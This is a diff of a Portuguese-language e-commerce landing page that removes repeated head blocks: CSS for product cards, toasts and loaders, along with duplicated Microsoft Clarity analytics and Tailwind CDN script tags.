@@ -1,3299 +1,1019 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-    <style>
-        .protecao-lista li .check {
-            color: #b58200;
-            font-size: 15px;
-            margin-right: 5px;
-            font-weight: bold;
-        }
-
-        .protecao-cliente {
-            background: #fffbe7;
-            border: none;
-            border-radius: 0;
-            padding: 2px 14px 2px 14px;
-            margin: 10px 0 0 0;
-            box-shadow: 0 1px 4px #0001;
-            max-width: 430px;
-        }
-
-        .protecao-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 2px;
-        }
-
-        .protecao-header .header-left {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-weight: 600;
-            color: #b58200;
-            font-size: 13px;
-        }
-
-        .protecao-header .header-right {
-            display: flex;
-            align-items: center;
-        }
-
-        .protecao-lista {
-            list-style: none;
-            padding: 0;
-            margin: 0 0 0 16px;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 2px 8px;
-            justify-content: flex-start;
-        }
-
-        .protecao-lista li {
-            background: transparent;
-            color: #222;
-            font-size: 12px;
-            font-weight: 500;
-            border-radius: 4px;
-            padding: 0 2px 0 2px;
-            display: flex;
-            align-items: center;
-            min-width: 140px;
-            box-shadow: none;
-        }
-
-        .protecao-lista li .check {
-            color: #b58200;
-            font-size: 13px;
-            margin-right: 4px;
-            font-weight: bold;
-        }
-
-        .protecao-lista li::before {
-            content: '';
-            margin-right: 0;
-        }
-    /* Garantir layout em coluna e centralização nos cards do carrossel */
-    .mais-desta-loja-card {
-        display: flex;
-        flex-direction: column;
-        align-items: stretch;
-        justify-content: flex-start;
-        padding: 10px 0 14px 0;
-        background: none;
-        border-radius: 0;
-        box-shadow: none;
-        min-width: 140px;
-        max-width: 160px;
-        width: 100%;
-        min-height: 340px;
-        height: 400px;
-        margin: 0 0 0 0;
-        position: relative;
-    }
-    
-    /* Override: novo layout compacto dos cards da seção "Mais desta loja" */
-    .mais-desta-loja-card {
-        display: flex;
-        flex-direction: column;
-        width: 112px;
-        min-width: 112px;
-        min-height: 210px;
-        height: 210px;
-        padding: 0;
-        margin: 0;
-        background: none !important;
-        border: none;
-        box-shadow: none !important;
-        position: relative;
-    }
-    .mais-desta-loja-card .img-wrap {
-        width: 100%;
-        aspect-ratio: 1/1; /* mantém formato quadrado, sem mexer no tamanho configurado */
-        position: relative;
-        display: block;
-        overflow: hidden;
-        background: none;
-        margin: 0;
-        padding: 0;
-    }
-    .mais-desta-loja-card .img-wrap img {
-        position: absolute;
-        inset: 0;
-        width: 100%;
-        height: 100%;
-        object-fit: cover; /* preenche toda área */
-        border-radius: 0 !important;
-        display: block;
-        margin: 0;
-    }
-    .mais-desta-loja-card .valores {
-        margin-top: 0;
-        display: flex;
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 1px;
-        position: static; /* abaixo da imagem, sem sobrepor e sem mexer na imagem */
-        padding: 6px 0 0 2px; /* padding entre imagem e valores */
-    }
-    .mais-desta-loja-card .preco {
-        font-size: 5px;
-        font-weight: 600;
-        color: #000000;
-        margin: 0;
-        text-align: left;
-        line-height: 1;
-    }
-    .mais-desta-loja-card .desconto {
-        font-size: 5px;
-        font-weight: 600;
-        color: #ff2d55;
-        margin: 0;
-        text-align: left;
-        line-height: 1;
-        background: #ffe4ee;
-        display: inline-block;
-        padding: 1px 3px;
-        border-radius: 3px;
-    }
-        
-
-        .reviews-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-
-        .reviews-header .title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #222;
-        }
-
-        .reviews-header .subtitle {
-            font-size: 12px;
-            color: #888;
-            margin-top: 1px;
-        }
-
-        .reviews-header .chev {
-            color: #bbb;
-            margin-left: 8px;
-            display: flex;
-            align-items: center;
-        }
-
-        .pills {
-            display: flex;
-            gap: 7px;
-            flex-wrap: nowrap;
-            overflow-x: auto;
-            margin-bottom: 0;
-            scrollbar-width: none;
-        }
-
-        .pills::-webkit-scrollbar {
-            display: none;
-        }
-
-        .pill {
-            white-space: nowrap;
-        }
-
-        .pill {
-            display: flex;
-            align-items: center;
-            background: #f8f8fa;
-            border-radius: 7px;
-            padding: 4px 10px;
-            font-size: 13px;
-            color: #222;
-            box-shadow: none;
-            gap: 6px;
-            min-width: 0;
-            cursor: pointer;
-            border: 1px solid #ededed;
-            transition: box-shadow .18s, border .18s;
-        }
-
-        .pill:active,
-        .pill:focus {
-            border: 1.5px solid #ff2d55;
-            box-shadow: 0 2px 8px #ff2d5522;
-        }
-
-        .media-pill svg {
-            width: 18px;
-            height: 18px;
-            margin-right: 3px;
-        }
-
-        .star-pill .badge {
-            display: flex;
-            align-items: center;
-            gap: 2px;
-            background: none;
-            color: #222;
-            font-weight: 700;
-            border-radius: 0;
-            padding: 0;
-            font-size: 13px;
-        }
-
-        .star-pill .badge svg {
-            margin-right: 3px;
-            width: 15px;
-            height: 15px;
-            fill: #ffc107;
-            flex-shrink: 0;
-        }
-
-        .star-pill .count {
-            color: #888;
-            font-size: 13px;
-            margin-left: 4px;
-        }
-
-        @media (max-width: 500px) {
-            .reviews-card {
-                max-width: 98vw;
-                padding: 0 2vw 8px 2vw;
-            }
-        }
-    </style>
-    <style>
-        .save-btn-wrap {
-            position: relative;
-            display: inline-block;
-        }
-
-        .save-btn-wrap img {
-            transition: filter .2s;
-            position: relative;
-            z-index: 2;
-        }
-
-        /* Nenhum efeito visual no ícone de salvar */
-    </style>
-    <!-- TikTok Pixel Code Start (REMOVIDO: código corrompido) -->
-    <!-- TikTok Pixel Code End -->
-    <script async="" src="https://www.clarity.ms/tag/t9udqznhez"></script><script async="" src="https://www.clarity.ms/tag/t9udqznhez"></script><script async="" src="https://www.clarity.ms/tag/t9udqznhez"></script><script async="" src="https://www.clarity.ms/tag/t9udqznhez"></script><script async="" src="https://www.clarity.ms/tag/t9udqznhez"></script><script async="" src="https://www.clarity.ms/tag/t9udqznhez"></script><script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t9udqznhez");
-    </script>
-
-    <!-- Tailwind -->
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <title>Shop</title>
-    <link href="css/stylesss.css" rel="stylesheet">
-    <style>
-        /* Deixa o CTA do modal flutuando (sticky) como no index + compat iOS */
-        #buy-positions {
-            position: -webkit-sticky;
-            /* iOS Safari */
-            position: sticky;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 30;
-            background: #ffffff;
-            /* sólido para não vazar o fundo */
-            box-shadow: 0 -2px 12px #0001;
-            padding-top: 18px;
-            padding-right: 16px;
-            padding-left: 16px;
-            padding-bottom: 12px;
-            /* fallback */
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-            /* iOS safe area */
-            margin-top: 0;
-            border-radius: 0 !important;
-            text-transform: uppercase;
-        }
-
-        /* Toast minimal para feedback central (compatível com o index) */
-        .toast-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(.98);
-            min-width: 240px;
-            max-width: 90vw;
-            background: #3a3a3a;
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 14px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, .08);
-            z-index: 9999;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: opacity .25s ease, transform .25s ease;
-            pointer-events: none;
-        }
-
-        .toast-center.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .toast-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: inline-grid;
-            place-items: center;
-        }
-
-        .toast-icon.success {
-            background: #2ecc71;
-        }
-
-        .toast-icon.error {
-            background: #e74c3c;
-        }
-
-        .toast-icon.info {
-            background: #3498db;
-        }
-
-        .toast-text {
-            font-weight: 600;
-        }
-
-        .toast-icon svg {
-            width: 14px;
-            height: 14px;
-            stroke: #fff;
-        }
-
-        /* Loader de bolinhas deslizantes (vermelho e ciano) */
-        .dots-line {
-            position: relative;
-            width: 28px;
-            height: 10px;
-        }
-
-        .dots-line .dot {
-            position: absolute;
-            top: 1px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            opacity: .95;
-        }
-
-        .dots-line .dot.dot-red {
-            left: 0;
-            background: #fe2d55;
-            animation: slide-right .9s ease-in-out infinite;
-        }
-
-        .dots-line .dot.dot-cyan {
-            right: 0;
-            background: #00f2ea;
-            animation: slide-left .9s ease-in-out infinite;
-        }
-
-        @keyframes slide-right {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-
-        @keyframes slide-left {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(-10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-    </style>
-    <style>
-        .mais-desta-loja-carousel {
-            display: flex;
-            gap: 0.7rem;
-            overflow-x: auto;
-            padding-bottom: 0.3rem;
-            scrollbar-width: none;
-            -ms-overflow-style: none;
-        }
-
-        .mais-desta-loja-carousel::-webkit-scrollbar {
-            display: none;
-        }
-
-        .mais-desta-loja-card {
-            width: 120px;
-            min-width: 120px;
-            max-width: 120px;
-            min-height: 160px;
-            height: 160px;
-            background: #fff;
-            border-radius: 0.8rem;
-            box-shadow: 0 2px 8px #0001;
-            padding: 0.5rem;
-            flex-shrink: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            transition: box-shadow 0.2s, transform 0.2s;
-            cursor: pointer;
-        }
-
-        .mais-desta-loja-card:hover {
-            box-shadow: 0 6px 18px #ff2d5522, 0 2px 8px #0002;
-            transform: translateY(-2px) scale(1.025);
-        }
-
-        .mais-desta-loja-card img {
-            border-radius: 0.6rem;
-            margin-bottom: 0.3rem;
-            width: 100%;
-            height: 70px;
-            object-fit: cover;
-            background: #f7f7f7;
-        }
-
-        .mais-desta-loja-card p {
-            margin: 0;
-            font-size: 13px;
-            text-align: center;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .mais-desta-loja-card .preco {
-            color: #000000;
-            font-weight: bold;
-            font-size: 0.98rem;
-        }
-
-        .mais-desta-loja-card .desconto {
-            color: #ff2d55;
-            font-size: 0.8rem;
-            background: #ffe4ee;
-            display: inline-block;
-            padding: 2px 6px;
-            border-radius: 6px;
-        }
-
-        .mais-desta-loja-section {
-            max-width: 520px;
-            margin: 0 auto;
-            padding: 12px 0 8px 0;
-        }
-    </style>
-    <!-- TikTok Pixel Code Start (REMOVIDO: código corrompido) -->
-    <!-- TikTok Pixel Code End -->
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t9udqznhez");
-    </script>
-
-    <!-- Tailwind -->
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <title>Shop</title>
-    <link href="/wav/stylesss.css" rel="stylesheet">
-    <style>
-        /* Deixa o CTA do modal flutuando (sticky) como no index + compat iOS */
-        #buy-positions {
-            position: -webkit-sticky;
-            /* iOS Safari */
-            position: sticky;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 30;
-            background: #ffffff;
-            /* sólido para não vazar o fundo */
-            box-shadow: 0 -2px 12px #0001;
-            padding-top: 18px;
-            padding-right: 16px;
-            padding-left: 16px;
-            padding-bottom: 12px;
-            /* fallback */
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-            /* iOS safe area */
-            margin-top: 0;
-            border-radius: 0 !important;
-            text-transform: uppercase;
-        }
-
-        /* Toast minimal para feedback central (compatível com o index) */
-        .toast-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(.98);
-            min-width: 240px;
-            max-width: 90vw;
-            background: #3a3a3a;
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 14px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, .08);
-            z-index: 9999;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: opacity .25s ease, transform .25s ease;
-            pointer-events: none;
-        }
-
-        .toast-center.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .toast-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: inline-grid;
-            place-items: center;
-        }
-
-        .toast-icon.success {
-            background: #2ecc71;
-        }
-
-        .toast-icon.error {
-            background: #e74c3c;
-        }
-
-        .toast-icon.info {
-            background: #3498db;
-        }
-
-        .toast-text {
-            font-weight: 600;
-        }
-
-        .toast-icon svg {
-            width: 14px;
-            height: 14px;
-            stroke: #fff;
-        }
-
-        /* Loader de bolinhas deslizantes (vermelho e ciano) */
-        .dots-line {
-            position: relative;
-            width: 28px;
-            height: 10px;
-        }
-
-        .dots-line .dot {
-            position: absolute;
-            top: 1px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            opacity: .95;
-        }
-
-        .dots-line .dot.dot-red {
-            left: 0;
-            background: #fe2d55;
-            animation: slide-right .9s ease-in-out infinite;
-        }
-
-        .dots-line .dot.dot-cyan {
-            right: 0;
-            background: #00f2ea;
-            animation: slide-left .9s ease-in-out infinite;
-        }
-
-        @keyframes slide-right {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-
-        @keyframes slide-left {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(-10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-    </style>
-    <style>
-        .mais-desta-loja-carousel {
-            display: flex;
-            gap: 0.7rem;
-            overflow-x: auto;
-            padding-bottom: 0.3rem;
-            scrollbar-width: none;
-            -ms-overflow-style: none;
-        }
-
-        .mais-desta-loja-carousel::-webkit-scrollbar {
-            display: none;
-        }
-
-        .mais-desta-loja-card {
-            width: 120px;
-            min-width: 120px;
-            max-width: 120px;
-            min-height: 160px;
-            height: 160px;
-            background: #fff;
-            border-radius: 0.8rem;
-            box-shadow: 0 2px 8px #0001;
-            padding: 0.5rem;
-            flex-shrink: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            transition: box-shadow 0.2s, transform 0.2s;
-            cursor: pointer;
-        }
-
-        .mais-desta-loja-card:hover {
-            box-shadow: 0 6px 18px #ff2d5522, 0 2px 8px #0002;
-            transform: translateY(-2px) scale(1.025);
-        }
-
-        .mais-desta-loja-card img {
-            border-radius: 0.6rem;
-            margin-bottom: 0.3rem;
-            width: 100%;
-            height: 70px;
-            object-fit: cover;
-            background: #f7f7f7;
-        }
-
-        .mais-desta-loja-card p {
-            margin: 0;
-            font-size: 13px;
-            text-align: center;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .mais-desta-loja-card .preco {
-            color: #ff2d55;
-            font-weight: bold;
-            font-size: 0.98rem;
-        }
-
-        .mais-desta-loja-card .desconto {
-            color: #aaa;
-            font-size: 0.8rem;
-        }
-
-        .mais-desta-loja-section {
-            max-width: 520px;
-            margin: 0 auto;
-            padding: 12px 0 8px 0;
-        }
-    </style>
-    <!-- TikTok Pixel Code Start (REMOVIDO: código corrompido) -->
-    <!-- TikTok Pixel Code End -->
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t9udqznhez");
-    </script>
-
-    <!-- Tailwind -->
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <title>Shop</title>
-    <link href="/landings/modelo/stylesss.css" rel="stylesheet">
-    <style>
-        /* Deixa o CTA do modal flutuando (sticky) como no index + compat iOS */
-        #buy-positions {
-            position: -webkit-sticky;
-            /* iOS Safari */
-            position: sticky;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 30;
-            background: #ffffff;
-            /* sólido para não vazar o fundo */
-            box-shadow: 0 -2px 12px #0001;
-            padding-top: 18px;
-            padding-right: 16px;
-            padding-left: 16px;
-            padding-bottom: 12px;
-            /* fallback */
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-            /* iOS safe area */
-            margin-top: 0;
-            border-radius: 0 !important;
-            text-transform: uppercase;
-        }
-
-        /* Toast minimal para feedback central (compatível com o index) */
-        .toast-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(.98);
-            min-width: 240px;
-            max-width: 90vw;
-            background: #3a3a3a;
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 14px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, .08);
-            z-index: 9999;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: opacity .25s ease, transform .25s ease;
-            pointer-events: none;
-        }
-
-        .toast-center.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .toast-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: inline-grid;
-            place-items: center;
-        }
-
-        .toast-icon.success {
-            background: #2ecc71;
-        }
-
-        .toast-icon.error {
-            background: #e74c3c;
-        }
-
-        .toast-icon.info {
-            background: #3498db;
-        }
-
-        .toast-text {
-            font-weight: 600;
-        }
-
-        .toast-icon svg {
-            width: 14px;
-            height: 14px;
-            stroke: #fff;
-        }
-
-        /* Loader de bolinhas deslizantes (vermelho e ciano) */
-        .dots-line {
-            position: relative;
-            width: 28px;
-            height: 10px;
-        }
-
-        .dots-line .dot {
-            position: absolute;
-            top: 1px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            opacity: .95;
-        }
-
-        .dots-line .dot.dot-red {
-            left: 0;
-            background: #fe2d55;
-            animation: slide-right .9s ease-in-out infinite;
-        }
-
-        .dots-line .dot.dot-cyan {
-            right: 0;
-            background: #00f2ea;
-            animation: slide-left .9s ease-in-out infinite;
-        }
-
-        @keyframes slide-right {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-
-        @keyframes slide-left {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(-10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-    </style>
-    <style>
-        .mais-desta-loja-carousel {
-            display: flex;
-            gap: 0.7rem;
-            overflow-x: auto;
-            padding-bottom: 0.3rem;
-            scrollbar-width: none;
-            -ms-overflow-style: none;
-        }
-
-        .mais-desta-loja-carousel::-webkit-scrollbar {
-            display: none;
-        }
-
-        .mais-desta-loja-card {
-            width: 120px;
-            min-width: 120px;
-            max-width: 120px;
-            min-height: 160px;
-            height: 160px;
-            background: #fff;
-            border-radius: 0.8rem;
-            box-shadow: 0 2px 8px #0001;
-            padding: 0.5rem;
-            flex-shrink: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            transition: box-shadow 0.2s, transform 0.2s;
-            cursor: pointer;
-        }
-
-        .mais-desta-loja-card:hover {
-            box-shadow: 0 6px 18px #ff2d5522, 0 2px 8px #0002;
-            transform: translateY(-2px) scale(1.025);
-        }
-
-        .mais-desta-loja-card img {
-            border-radius: 0.6rem;
-            margin-bottom: 0.3rem;
-            width: 100%;
-            height: 70px;
-            object-fit: cover;
-            background: #f7f7f7;
-        }
-
-        .mais-desta-loja-card p {
-            margin: 0;
-            font-size: 13px;
-            text-align: center;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .mais-desta-loja-card .preco {
-            color: #ff2d55;
-            font-weight: bold;
-            font-size: 0.98rem;
-        }
-
-        .mais-desta-loja-card .desconto {
-            color: #aaa;
-            font-size: 0.8rem;
-        }
-
-        .mais-desta-loja-section {
-            max-width: 520px;
-            margin: 0 auto;
-            padding: 12px 0 8px 0;
-        }
-    </style>
-    <!-- TikTok Pixel Code Start (REMOVIDO: código corrompido) -->
-    <!-- TikTok Pixel Code End -->
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t9udqznhez");
-    </script>
-
-    <!-- Tailwind -->
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <title>Shop</title>
-    <link href="/landings/modelo/stylesss.css" rel="stylesheet">
-    <style>
-        /* Deixa o CTA do modal flutuando (sticky) como no index + compat iOS */
-        #buy-positions {
-            position: -webkit-sticky;
-            /* iOS Safari */
-            position: sticky;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 30;
-            background: #ffffff;
-            /* sólido para não vazar o fundo */
-            box-shadow: 0 -2px 12px #0001;
-            padding-top: 18px;
-            padding-right: 16px;
-            padding-left: 16px;
-            padding-bottom: 12px;
-            /* fallback */
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-            /* iOS safe area */
-            margin-top: 0;
-            border-radius: 0 !important;
-            text-transform: uppercase;
-        }
-
-        /* Toast minimal para feedback central (compatível com o index) */
-        .toast-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(.98);
-            min-width: 240px;
-            max-width: 90vw;
-            background: #3a3a3a;
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 14px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, .08);
-            z-index: 9999;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: opacity .25s ease, transform .25s ease;
-            pointer-events: none;
-        }
-
-        .toast-center.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .toast-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: inline-grid;
-            place-items: center;
-        }
-
-        .toast-icon.success {
-            background: #2ecc71;
-        }
-
-        .toast-icon.error {
-            background: #e74c3c;
-        }
-
-        .toast-icon.info {
-            background: #3498db;
-        }
-
-        .toast-text {
-            font-weight: 600;
-        }
-
-        .toast-icon svg {
-            width: 14px;
-            height: 14px;
-            stroke: #fff;
-        }
-
-        /* Loader de bolinhas deslizantes (vermelho e ciano) */
-        .dots-line {
-            position: relative;
-            width: 28px;
-            height: 10px;
-        }
-
-        .dots-line .dot {
-            position: absolute;
-            top: 1px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            opacity: .95;
-        }
-
-        .dots-line .dot.dot-red {
-            left: 0;
-            background: #fe2d55;
-            animation: slide-right .9s ease-in-out infinite;
-        }
-
-        .dots-line .dot.dot-cyan {
-            right: 0;
-            background: #00f2ea;
-            animation: slide-left .9s ease-in-out infinite;
-        }
-
-        @keyframes slide-right {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-
-        @keyframes slide-left {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(-10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-    </style>
-    <style>
-        .mais-desta-loja-carousel {
-            display: flex;
-            gap: 0.7rem;
-            overflow-x: auto;
-            padding-bottom: 0.3rem;
-            scrollbar-width: none;
-            -ms-overflow-style: none;
-        }
-
-        .mais-desta-loja-carousel::-webkit-scrollbar {
-            display: none;
-        }
-
-        .mais-desta-loja-card {
-            width: 120px;
-            min-width: 120px;
-            max-width: 120px;
-            min-height: 160px;
-            height: 160px;
-            background: #fff;
-            border-radius: 0.8rem;
-            box-shadow: 0 2px 8px #0001;
-            padding: 0.5rem;
-            flex-shrink: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            transition: box-shadow 0.2s, transform 0.2s;
-            cursor: pointer;
-        }
-
-        .mais-desta-loja-card:hover {
-            box-shadow: 0 6px 18px #ff2d5522, 0 2px 8px #0002;
-            transform: translateY(-2px) scale(1.025);
-        }
-
-        .mais-desta-loja-card img {
-            border-radius: 0.6rem;
-            margin-bottom: 0.3rem;
-            width: 100%;
-            height: 70px;
-            object-fit: cover;
-            background: #f7f7f7;
-        }
-
-        .mais-desta-loja-card p {
-            margin: 0;
-            font-size: 13px;
-            text-align: center;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .mais-desta-loja-card .preco {
-            color: #ff2d55;
-            font-weight: bold;
-            font-size: 0.98rem;
-        }
-
-        .mais-desta-loja-card .desconto {
-            color: #aaa;
-            font-size: 0.8rem;
-        }
-
-        .mais-desta-loja-section {
-            max-width: 520px;
-            margin: 0 auto;
-            padding: 12px 0 8px 0;
-        }
-    </style>
-    <!-- TikTok Pixel Code Start (REMOVIDO: código corrompido) -->
-    <!-- TikTok Pixel Code End -->
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t9udqznhez");
-    </script>
-
-    <!-- Tailwind -->
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <title>Shop</title>
-    <link href="/landings/modelo/stylesss.css" rel="stylesheet">
-    <style>
-        /* Deixa o CTA do modal flutuando (sticky) como no index + compat iOS */
-        #buy-positions {
-            position: -webkit-sticky;
-            /* iOS Safari */
-            position: sticky;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 30;
-            background: #ffffff;
-            /* sólido para não vazar o fundo */
-            box-shadow: 0 -2px 12px #0001;
-            padding-top: 18px;
-            padding-right: 16px;
-            padding-left: 16px;
-            padding-bottom: 12px;
-            /* fallback */
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-            /* iOS safe area */
-            margin-top: 0;
-            border-radius: 0 !important;
-            text-transform: uppercase;
-        }
-
-        /* Toast minimal para feedback central (compatível com o index) */
-        .toast-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(.98);
-            min-width: 240px;
-            max-width: 90vw;
-            background: #3a3a3a;
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 14px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, .08);
-            z-index: 9999;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: opacity .25s ease, transform .25s ease;
-            pointer-events: none;
-        }
-
-        .toast-center.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .toast-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: inline-grid;
-            place-items: center;
-        }
-
-        .toast-icon.success {
-            background: #2ecc71;
-        }
-
-        .toast-icon.error {
-            background: #e74c3c;
-        }
-
-        .toast-icon.info {
-            background: #3498db;
-        }
-
-        .toast-text {
-            font-weight: 600;
-        }
-
-        .toast-icon svg {
-            width: 14px;
-            height: 14px;
-            stroke: #fff;
-        }
-
-        /* Loader de bolinhas deslizantes (vermelho e ciano) */
-        .dots-line {
-            position: relative;
-            width: 28px;
-            height: 10px;
-        }
-
-        .dots-line .dot {
-            position: absolute;
-            top: 1px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            opacity: .95;
-        }
-
